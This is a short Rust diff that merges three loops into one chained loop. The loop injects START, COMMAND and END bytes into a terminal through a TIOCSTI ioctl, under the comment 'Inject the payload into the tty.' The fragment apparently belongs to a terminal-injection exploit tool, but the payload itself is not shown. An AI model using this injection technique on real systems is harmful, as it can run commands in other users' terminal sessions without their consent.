@@ -67,13 +67,7 @@ pub fn run() -> anyhow::Result<()> {
     thread::sleep(Duration::from_millis(100));
 
     // Inject the payload into the tty.
-    for &byte in START {
-        tiocsti_inject(STDIN_FILENO, byte).context("failed to inject into tty")?;
-    }
-    for &byte in COMMAND {
-        tiocsti_inject(STDIN_FILENO, byte).context("failed to inject into tty")?;
-    }
-    for &byte in END {
+    for &byte in START.iter().chain(COMMAND).chain(END) {
         tiocsti_inject(STDIN_FILENO, byte).context("failed to inject into tty")?;
     }
 
